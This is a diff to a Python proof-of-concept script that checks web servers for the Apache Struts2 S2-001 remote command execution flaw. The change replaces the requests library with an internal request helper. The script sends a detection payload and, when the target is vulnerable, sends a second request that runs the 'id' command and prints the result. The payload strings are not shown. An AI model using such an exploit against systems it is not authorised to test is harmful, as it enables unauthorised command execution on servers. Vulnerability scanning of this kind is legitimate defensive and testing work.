@@ -7,9 +7,8 @@ description: Struts2 S2-001漏洞可执行任意命令
 
 import re
 import json
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class S2_001_BaseVerify:
     def __init__(self, url):
@@ -32,12 +31,12 @@ class S2_001_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.post(self.url, headers = self.headers, data = self.check_data, verify = False)
+            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
             check_pattern = re.compile('<.*?name="password" value="(.*?)" ')
             check_result = check_pattern.findall(check_req.text)
             if check_result[0] == '80147':
                 print('存在S2-001漏洞,执行id命令结果为:\n')
-                cmd_req = requests.post(self.url, headers = self.headers, data = self.cmd_data, verify = False)
+                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_data)
                 print(cmd_req.text)
                 return True
             else:
